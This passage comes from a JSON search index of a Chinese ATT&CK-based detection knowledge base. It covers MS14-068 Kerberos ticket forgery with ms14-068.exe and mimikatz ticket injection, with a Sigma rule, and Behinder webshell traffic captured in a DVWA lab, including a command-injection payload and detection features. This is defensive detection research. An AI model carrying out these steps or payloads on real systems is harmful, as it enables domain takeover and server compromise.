c\u4ee5\u6b64\u4f5c\u4e3a\u83b7\u53d6\u6709\u7528\u51ed\u636e\u7684\u9014\u5f84\u6216\u89c4\u907f\u83b7\u53d6\u7cfb\u7edf\u8bbf\u95ee\u6743\u9650\u7684\u8fc7\u7a0b\u3002\u5176\u4e2d\u4e00\u4e2a\u793a\u4f8b\u662fMS14-068\uff0c\u5b83\u9488\u5bf9Kerberos\uff0c\u53ef\u7528\u4e8e\u4f7f\u7528\u57df\u7528\u6237\u6743\u9650\u4f2a\u9020Kerberos\u7968\u8bc1.\u5bf9\u51ed\u636e\u8bbf\u95ee\u7684\u5229\u7528\u8fd8\u53ef\u80fd\u5bfc\u81f4\u7279\u6743\u5347\u7ea7\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u76ee\u6807\u8fc7\u7a0b\u6216\u83b7\u53d6\u7684\u51ed\u636e\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-PYKEK/#_1","text":"\u53ef\u53c2\u8003\uff1a \u5185\u7f51\u6e17\u900f\u4e4bPTH&PTT&PTK","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-PYKEK/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7\uff08AD\u57df\u63a7\u65e5\u5fd7\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-PYKEK/#_3","text":"\u6d4b\u8bd5\u6b65\u9aa4 \u57df\u63a7\u4e3b\u673a\uff08Windows server 2008\uff09 \u57df\u5185\u4e3b\u673a\uff08Windows 7 SP1\uff09 whoami /user #\u57df\u5185\u4e3b\u673a\u67e5\u627e\u5f53\u524d\u7528\u6237SID dir \\\\DC\\C$ #\u67e5\u770b\u8bbf\u95eeDC\u7684\u6743\u9650 ms14-.exe -u \u57df\u6210\u5458\u540d@\u57df\u540d -s \u57df\u6210\u5458sid -d \u57df\u63a7\u5236\u5668\u5730\u5740 -p \u57df\u6210\u5458\u5bc6\u7801 #\u57df\u673a\u5668\u662f\u53ef\u4ee5\u548c\u57df\u63a7\u5236\u5668\u4e92\u901a\u5219\u4f1a\u521b\u5efa.ccache\u6587\u4ef6 \u7968\u636e\u6ce8\u5165 mimikatz # kerberos::purge //\u6e05\u7a7a\u5f53\u524d\u673a\u5668\u4e2d\u6240\u6709\u51ed\u8bc1\uff0c\u5982\u679c\u6709\u57df\u6210\u5458\u51ed\u8bc1\u4f1a\u5f71\u54cd\u51ed\u8bc1\u4f2a\u9020 mimikatz # kerberos::list //\u67e5\u770b\u5f53\u524d\u673a\u5668\u51ed\u8bc1 mimikatz # kerberos::ptc \u7968\u636e\u6587\u4ef6 //\u5c06\u7968\u636e\u6ce8\u5165\u5230\u5185\u5b58\u4e2d \u4f7f\u7528mimikatz\u5c06\u7968\u636e\u6ce8\u5165\u5230\u5f53\u524d\u5185\u5b58\u4e2d\uff0c\u4f2a\u9020\u51ed\u8bc1\uff0c\u5982\u679c\u6210\u529f\u5219\u62e5\u6709\u57df\u7ba1\u7406\u6743\u9650\uff0c\u53ef\u4efb\u610f\u8bbf\u95ee\u57df\u4e2d\u6240\u6709\u673a\u5668","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-PYKEK/#_4","text":"\u6d4b\u8bd5\u7559\u75d5\u6587\u4ef6\uff1a MS14-068-PYKEK-windows.log","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-PYKEK/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-PYKEK/#sigma","text":"title: MS14-068-PYKEK description: windows server 2008 / windows 7 references: https://github.com/ThreatHuntingProject/ThreatHunting/blob/master/hunts/golden_ticket.md tags: T1212 status: experimental author: 12306Bro logsource: product: windows service: Security detection: selection1: EventID: 4624 #\u8d26\u6237\u767b\u5f55 Account Domain: '*.*' #\u65b0\u767b\u5f55>\u8d26\u6237\u57df(\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8d26\u6237\u57df\u5e94\u4e3aABC\uff0c\u5f53\u5b58\u5728PYKEK\u653b\u51fb\u65f6\uff0c\u8d26\u6237\u57df\u4e3aABC.COM) Account Name: '*' #\u65b0\u767b\u5f55>\u8d26\u6237\u540d(\u4e0d\u540c\u4e8e\u5b89\u5168\u6807\u8bc6\u7684\u5e10\u6237\uff0c\u6b64\u6761\u4ef6\u5b9e\u73b0\u8d77\u6765\u8f83\u4e3a\u590d\u6742) selection2: EventID: 4672 #\u7ba1\u7406\u5458\u767b\u5f55 Account Domain: '*.*' #\u8d26\u6237\u57df(\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8d26\u6237\u57df\u5e94\u4e3aABC\uff0c\u5f53\u5b58\u5728PYKEK\u653b\u51fb\u65f6\uff0c\u8d26\u6237\u57df\u4e3aABC.COM) selection3: EventID: 4768 #Kerberos TGS\u8bf7\u6c42 Supplied Realm Name: '*.*' #\u5df2\u63d0\u4f9b\u7684\u9886\u57df\u540d\u79f0(\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u5df2\u63d0\u4f9b\u7684\u9886\u57df\u540d\u79f0\u5e94\u4e3aABC\uff0c\u5f53\u5b58\u5728PYKEK\u653b\u51fb\u65f6\uff0c\u5df2\u63d0\u4f9b\u7684\u9886\u57df\u540d\u79f0\u4e3aABC.COM) timeframe: last 5s condition: all of them level: medium","title":"sigma\u89c4\u5219"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-PYKEK/#_6","text":"\u672c\u89c4\u5219\u672a\u7ecf\u8fc7\u5b9e\u9645\u73af\u5883\u68c0\u9a8c\uff0c\u8c28\u614e\u4f7f\u7528","title":"\u5efa\u8bae"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-PYKEK/#_7","text":"MITRE-ATT&CK-T1212 https://attack.mitre.org/techniques/T1212/ \u5185\u7f51\u6e17\u900f\u4e4bPTH&PTT&PTK https://www.bbsmax.com/A/A7zgkjRPz4/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/","text":"T1505-003-webshell-\u51b0\u874e \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 Webshell\u662f\u4e00\u4e2aWeb\u811a\u672c\uff0c\u653e\u7f6e\u5728\u53ef\u516c\u5f00\u8bbf\u95ee\u7684Web\u670d\u52a1\u5668\u4e0a\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u5c06Web\u670d\u52a1\u5668\u7528\u4f5c\u7f51\u7edc\u7684\u7f51\u5173\u3002 Web shell\u53ef\u4ee5\u63d0\u4f9b\u591a\u79cd\u529f\u80fd\uff0c\u5982\u865a\u62df\u7ec8\u7aef\u3001\u6587\u4ef6\u7ba1\u7406\u3001\u6570\u636e\u5e93\u8fde\u63a5\u7b49\u3002 \u9664\u4e86\u670d\u52a1\u5668\u7aef\u811a\u672c\u4e4b\u5916\uff0cWebshell\u53ef\u80fd\u8fd8\u6709\u4e00\u4e2a\u5ba2\u6237\u7aef\u63a5\u53e3\u7a0b\u5e8f\uff0c\u7528\u4e8e\u4e0e\u7ba1\u7406Web\u670d\u52a1\u5668\u7684\u901a\u4fe1\uff08\u4f8b\u5982\uff0c\u4e2d\u56fd\u83dc\u5200\u3001C\u5200\u3001\u8681\u5251\u3001\u51b0\u874e\u7b49\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b PHP\u7f51\u7ad9\uff08Phpstudy+DVWA\uff09 \u51b0\u874eV1.0/V2.0\uff08\u5ba2\u6237\u7aef+\u81ea\u5e26shell\uff09 wireshark\uff08\u5fc5\u5907\uff09 \u68c0\u6d4b\u65e5\u5fd7 HTTP\u6d41\u91cf \u6d4b\u8bd5\u590d\u73b0 \u5229\u7528DVWA\u76f8\u5173\u6f0f\u6d1e\uff0c\u4e0a\u4f20\u51b0\u874e\u9ed8\u8ba4webshell\uff0c\u5229\u7528\u51b0\u874e\u5ba2\u6237\u7aef\u5bf9webshell\u8fdb\u884c\u7ba1\u7406\uff0c\u6293\u53d6\u51b0\u874e\u5ba2\u6237\u7aef\u4e0eweb\u670d\u52a1\u5668\u4e0a\u7684\u811a\u672c\u4e4b\u95f4\u7684\u901a\u8baf\u6d41\u91cf\u3002 \u6d4b\u8bd5\u7559\u75d5 \u51b0\u874eV1.0 1\uff09\u6b63\u5e38\u6d41\u91cf GET\u8bf7\u6c42\u5305 a GET /1.php HTTP/1.1 Host: 192.168.66.136 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9, / ;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://192.168.66.136/ DNT: 1 Connection: keep-alive Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 GET\u8bf7\u6c42\u8fd4\u56de\u5305 a HTTP/1.1 200 OK Date: Tue, 20 Aug 2019 02:50:43 GMT Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45 X-Powered-By: PHP/5.4.45 Content-Length: 4 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html test POST\u8bf7\u6c42\u5305 a POST /DVWA/vulnerabilities/exec/ HTTP/1.1 Host: 192.168.66.136 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9, / ;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 40 DNT: 1 Connection: keep-alive Referer: http://192.168.66.136/DVWA/vulnerabilities/exec/ Cookie: security=low; PHPSESSID=190krorgsuckk0elaa1tk0v891 Upgrade-Insecure-Requests: 1 ip=127.0.0.1+%26%26+whoami&Submit=Submit POST\u8fd4\u56de\u5305 a HTTP/1.1 200 OK Date: Tue, 20 Aug 2019 02:52:47 GMT Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45 X-Powered-By: PHP/5.4.45 Expires: Tue, 23 Jun 2009 12:00:00 GMT Cache-Control: no-cache, must-revalidate Pragma: no-cache Content-Length: 5161 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html;charset=utf-8 !DOCTYPE html PUBLIC \"-//W3C//DTD\uff08\u6b64\u5904\u7701\u7565\u66f4\u591a\u5b57\u7b26\u4fe1\u606f\uff09 2\uff09\u51b0\u874e\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u7aef\u901a\u4fe1\u6d41\u91cf GET\u8bf7\u6c42\u5305 GET /shell.php?pass=1 HTTP/1.1 User-Agent: Java/1.8.0_211 Host: 192.168.66.136 Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Connection: keep-alive GET\u8fd4\u56de\u5305 HTTP/1.1 200 OK Date: Sun, 21 Jul 2019 02:51:55 GMT Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45 X-Powered-By: PHP/5.4.45 Set-Cookie: PHPSESSID=6dclf3mic9i86q7r6snpk34ef1; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Content-Length: 16 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html f52eb8c003a3991b POST\u8bf7\u6c42\u5305 POST /shell.php HTTP/1.1 Content-Type: application/octet-stream Cookie: null;PHPSESSID=6dclf3mic9i86q7r6snpk34ef1; path=/ Cache-Control: no-cache Pragma: no-cache User-Agent: Java/1.8.0_211 Host: 192.168.66.136 Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Connection: keep-alive Content-Length: 1624 D3dH8lwIFCCGYS9Yca \uff08\u6b64\u5904\u7701\u7565\u52a0\u5bc6\u5b57\u7b26\u4fe1\u606f\uff09 POST\u8fd4\u56de\u5305 HTTP/1.1 200 OK Date: Sun, 21 Jul 2019 02:51:55 GMT Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45 X-Powered-By: PHP/5.4.45 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Keep-Alive: timeout=5, max=99 Connection: Keep-Alive Transfer-Encoding: chunked Content-Type: text/html 1f4c0\uff08\u6b64\u5904\u7701\u7565\u52a0\u5bc6\u5b57\u7b26\u4fe1\u606f\uff09 3\uff09\u6b63\u5e38\u6d41\u91cfVS\u51b0\u874e\u901a\u8baf\u6d41\u91cf \u4ece\u4e2d\u53ef\u4ee5\u770b\u5230\u51b0\u874eV1.0\u7248\u672c\u5728\u521d\u671f\u4ea4\u4e92\u901a\u8baf\u65f6\uff0c\u7279\u5f81\u8f83\u4e3a\u660e\u663e\uff0cuser-agent\u4e0e\u6b63\u5e38\u4e1a\u52a1\u6d41\u91cf\u660e\u663e\u4e0d\u540c\u3002\u53ef\u4ee5\u901a\u8fc7\u5bf9 user-agent \u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u3002\u5176\u6b21\u5728POST\u8fd4\u56de\u5305\u4e2d\u76f8\u5bf9\u6b63\u5e38\u6d41\u91cf\u591a\u4e86 Transfer-Encoding: chunked \uff0cTransfer-Encoding\u4e3b\u8981\u662f\u7528\u6765\u6539\u53d8\u62a5\u6587\u683c\u5f0f\uff0c\u8fd9\u91cc\u6307\u7684\u662f\u5229\u7528\u5206\u5757\u8fdb\u884c\u4f20\u8f93\u3002\u4f60\u53ef\u4ee5\u57fa\u4e8e\u6b64\u7279\u5f81\u503c\u8fdb\u884c\u68c0\u6d4b\uff0c\u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u7528\u66f4\u7b80\u5355\u7684\u65b9\u6cd5\u8fdb\u884c\u68c0\u6d4b\uff0c\u6bd4\u5982url\u4e2d\u5305\u542b .php?pass= \u6765\u8fdb\u884c\u68c0\u6d4b\u3002 \u51b0\u874eV2.1 \u4ece\u51b0\u874eV1.1\u5f00\u59cb\u65b0\u589e\u968f\u673aUserAgent\u652f\u6301\uff0c\u6bcf\u6b21\u4f1a\u8bdd\u4f1a\u4ece17\u79cd\u5e38\u89c1UserAgent\u4e2d\u968f\u673a\u9009\u53d6\u3002\u51b0\u874e\u6700\u65b0\u7248\u672c\u4e3aV2.1\uff0c\u53ef\u4ee5\u901a\u8fc7\u5bf92.1\u7248\u672c\u670d\u52a1\u7aef\u4e0e\u5ba2\u6237\u7aef\u7684\u901a\u4fe1\u6d41\u91cf\uff0c\u8fdb\u884c\u6355\u83b7\uff0c\u5bf9\u6bd4\u6b63\u5e38\u6d41\u91cf\u8fdb\u884c\u5206\u6790\u3002 1\uff09\u6b63\u5e38\u6d41\u91cfa GET\u8bf7\u6c42\u5305 a \u540c\u51b0\u874eV1.0\u7ae0\u8282 GET\u8bf7\u6c42\u8fd4\u56de\u5305 a \u540c\u51b0\u874eV1.0\u7ae0\u8282 POST\u8bf7\u6c42\u5305 a \u540c\u51b0\u874eV1.0\u7ae0\u8282 POST\u8fd4\u56de\u5305 a \u540c\u51b0\u874eV1.0\u7ae0\u8282 2\uff09\u51b0\u874e\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u7aef\u901a\u4fe1\u6d41\u91cfa GET\u8bf7\u6c42\u5305 a GET /DVWA/hackable/uploads/shell.php?pass=673 HTTP/1.1 Content-type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3) Host: 192.168.66.136 Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Connection: keep-alive **GET\u8bf7\u6c42\u8fd4\u56de\u5305**a HTTP/1.1 200 OK Date: Mon, 19 Aug 2019 09:34:36 GMT Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45 X-Powered-By: PHP/5.4.45 Set-Cookie: PHPSESSID=m0agat42tmo0i4srnda5ssfq94; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Content-Length: 16 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html 03befc81cbefda94 POST\u8bf7\u6c42\u5305 POST /DVWA/hackable/uploads/shell.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: PHPSESSID=bv5lv0681hq09ggt8rfj1peio5; path=/ User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3) Cache-Control: no-cache Pragma: no-cache Host: 192.168.66.136 Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Connection: keep-alive Content-Length: 2220 ltEi32XJreSl8Y5Hhzk08Wgjfe8bLPr3x8n4qlJ\uff08\u6b64\u5904\u7701\u7565\u52a0\u5bc6\u5b57\u7b26\u4fe1\u606f\uff09 POST\u8fd4\u56de\u5305 HTTP/1.1 200 OK Date: Mon, 19 Aug 2019 09:34:36 GMT Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45 X-Powered-By: PHP/5.4.45 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Keep-Alive: timeout=5, max=97 Connection: Keep-Alive Transfer-Encoding: chunked Content-Type: text/html 21dc0gfUOcrBcH7jint5L0pmkDxT5ypIbjLnIsXnDxHGjofQk3g\uff08\u6b64\u5904\u7701\u7565\u52a0\u5bc6\u5b57\u7b26\u4fe1\u606f\uff09 3\uff09\u6b63\u5e38\u6d41\u91cfVS\u51b0\u874e\u901a\u8baf\u6d41\u91cfa \u901a\u8fc7\u5bf9\u6bd4\u53ef\u4ee5\u770b\u5230\uff0c\u51b0\u874eV2.1\u5728\u521d\u671f\u4ea4\u4e92\u901a\u8baf\u65f6\u6d41\u91cf\u4e2d\u591a\u4e86 Transfer-Encoding: chunked \uff0cTransfer-Encoding\u4e3b\u8981\u662f\u7528\u6765\u6539\u53d8\u62a5\u6587\u683c\u5f0f\uff0c\u8fd9\u91cc\u6307\u7684\u662f\u5229\u7528\u5206\u5757\u8fdb\u884c\u4f20\u8f93\u3002\u4f60\u53ef\u4ee5\u57fa\u4e8e\u6b64\u7279\u5f81\u503c\u8fdb\u884c\u68c0\u6d4b\uff0c\u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u7528\u66f4\u7b80\u5355\u7684\u65b9\u6cd5\u8fdb\u884c\u68c0\u6d4b\uff0c\u6bd4\u5982url\u4e2d\u5305\u542b .php?pass= \u6765\u8fdb\u884c\u68c0\u6d4b\u3002 \u68c0\u6d4b\u7279\u5f81/\u601d\u8def \u51b0\u874eV1.0a \u57fa\u4e8eGET\u8bf7\u6c42\u5305\u7684\u68c0\u6d4b\u7279\u5f81\uff1aurl\u5305\u542b.php?pass=\uff0cuseragent\u5305\u542bJava/*\uff1b \u57fa\u4e8ePOST\u8bf7\u6c42\u5305\u7684\u68c0\u6d4b\u7279\u5f81\uff1auseragent\u5305\u542bJava/* \uff0c\u8fd4\u56de\u5305\u5305\u542b\uff1aTransfer-Encoding: chunked\uff1b \u51b0\u874eV2.1a \u57fa\u4e8eGET\u8bf7\u6c42\u5305\u7684\u68c0\u6d4b\u7279\u5f81\uff1aurl\u5305\u542b.php?pass=\uff1b\uff08\u5982\u679c\u4e0e\u4e1a\u52a1\u51b2\u7a81\uff0c\u8bef\u62a5\u8f83\u5927\uff09 \u57fa\u4e8ePOST\u8fd4\u56de\u5305\u7684\u68c0\u6d4b\u7279\u5f81\uff1aTransfer-Encoding: chunked\uff1b \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1505-003 https://attack.mitre.org/techniques/T1505/003/ \u51b0\u874e\u4e0b\u8f7d\u5730\u5740 https://github.com/rebeyond/Behinder/releases","title":"T1505-003-webshell-\u51b0\u874e"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#t1505-003-webshell-","text":"","title":"T1505-003-webshell-\u51b0\u874e"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#attck","text":"Webshell\u662f\u4e00\u4e2aWeb\u811a\u672c\uff0c\u653e\u7f6e\u5728\u53ef\u516c\u5f00\u8bbf\u95ee\u7684Web\u670d\u52a1\u5668\u4e0a\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u5c06Web\u670d\u52a1\u5668\u7528\u4f5c\u7f51\u7edc\u7684\u7f51\u5173\u3002 Web shell\u53ef\u4ee5\u63d0\u4f9b\u591a\u79cd\u529f\u80fd\uff0c\u5982\u865a\u62df\u7ec8\u7aef\u3001\u6587\u4ef6\u7ba1\u7406\u3001\u6570\u636e\u5e93\u8fde\u63a5\u7b49\u3002 \u9664\u4e86\u670d\u52a1\u5668\u7aef\u811a\u672c\u4e4b\u5916\uff0cWebshell\u53ef\u80fd\u8fd8\u6709\u4e00\u4e2a\u5ba2\u6237\u7aef\u63a5\u53e3\u7a0b\u5e8f\uff0c\u7528\u4e8e\u4e0e\u7ba1\u7406Web\u670d\u52a1\u5668\u7684\u901a\u4fe1\uff08\u4f8b\u5982\uff0c\u4e2d\u56fd\u83dc\u5200\u3001C\u5200\u3001\u8681\u5251\u3001\u51b0\u874e\u7b49\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#_1","text":"PHP\u7f51\u7ad9\uff08Phpstudy+DVWA\uff09 \u51b0\u874eV1.0/V2.0\uff08\u5ba2\u6237\u7aef+\u81ea\u5e26shell\uff09 wireshark\uff08\u5fc5\u5907\uff09","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#_2","text":"HTTP\u6d41\u91cf","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#_3","text":"\u5229\u7528DVWA\u76f8\u5173\u6f0f\u6d1e\uff0c\u4e0a\u4f20\u51b0\u874e\u9ed8\u8ba4webshell\uff0c\u5229\u7528\u51b0\u874e\u5ba2\u6237\u7aef\u5bf9webshell\u8fdb\u884c\u7ba1\u7406\uff0c\u6293\u53d6\u51b0\u874e\u5ba2\u6237\u7aef\u4e0eweb\u670d\u52a1\u5668\u4e0a\u7684\u811a\u672c\u4e4b\u95f4\u7684\u901a\u8baf\u6d41\u91cf\u3002","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#_4","text":"","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#v10","text":"","title":"\u51b0\u874eV1.0"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#1","text":"GET\u8bf7\u6c42\u5305 a GET /1.php HTTP/1.1 Host: 192.168.66.136 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9, / ;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://192.168.66.136/ DNT: 1 Connection: keep-alive Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 GET\u8bf7\u6c42\u8fd4\u56de\u5305 a HTTP/1.1 200 OK Date: Tue, 20 Aug 2019 02:50:43 GMT Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45 X-Powered-By: PHP/5.4.45 Content-Length: 4 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html test POST\u8bf7\u6c42\u5305 a POST /DVWA/vulnerabilities/exec/ HTTP/1.1 Host: 192.168.66.136 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9, / ;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 40 DNT: 1 Connection: keep-alive Referer: http://192.168.66.136/DVWA/vulnerabilities/exec/ Cookie: security=low; PHPSESSID=190krorgsuckk0elaa1tk0v891 Upgrade-Insecure-Requests: 1 ip=127.0.0.1+%26%26+whoami&Submit=Submit POST\u8fd4\u56de\u5305 a HTTP/1.1 200 OK Date: Tue, 20 Aug 2019 02:52:47 GMT Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45 X-Powered-By: PHP/5.4.45 Expires: Tue, 23 Jun 2009 12:00:00 GMT Cache-Control: no-cache, must-revalidate Pragma: no-cache Content-Length: 5161 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html;charset=utf-8 !DOCTYPE html PUBLIC \"-//W3C//DTD\uff08\u6b64\u5904\u7701\u7565\u66f4\u591a\u5b57\u7b26\u4fe1\u606f\uff09","title":"1\uff09\u6b63\u5e38\u6d41\u91cf"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#2","text":"GET\u8bf7\u6c42\u5305 GET /shell.php?pass=1 HTTP/1.1 User-Agent: Java/1.8.0_211 Host: 192.168.66.136 Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Connection: keep-alive GET\u8fd4\u56de\u5305 HTTP/1.1 200 OK Date: Sun, 21 Jul 2019 02:51:55 GMT Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45 X-Powered-By: PHP/5.4.45 Set-Cookie: PHPSESSID=6dclf3mic9i86q7r6snpk34ef1; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Content-Length: 16 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html f52eb8c003a3991b POST\u8bf7\u6c42\u5305 POST /shell.php HTTP/1.1 Content-Type: application/octet-stream Cookie: null;PHPSESSID=6dclf3mic9i86q7r6snpk34ef1; path=/ Cache-Control: no-cache Pragma: no-cache User-Agent: Java/1.8.0_211 Host: 192.168.66.136 Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Connection: keep-alive Content-Length: 1624 D3dH8lwIFCCGYS9Yca \uff08\u6b64\u5904\u7701\u7565\u52a0\u5bc6\u5b57\u7b26\u4fe1\u606f\uff09 POST\u8fd4\u56de\u5305 HTTP/1.1 200 OK Date: Sun, 21 Jul 2019 02:51:55 GMT Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45 X-Powered-By: PHP/5.4.45 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Keep-Alive: timeout=5, max=99 Connection: Keep-Alive Transfer-Encoding: chunked Content-Type: text/html 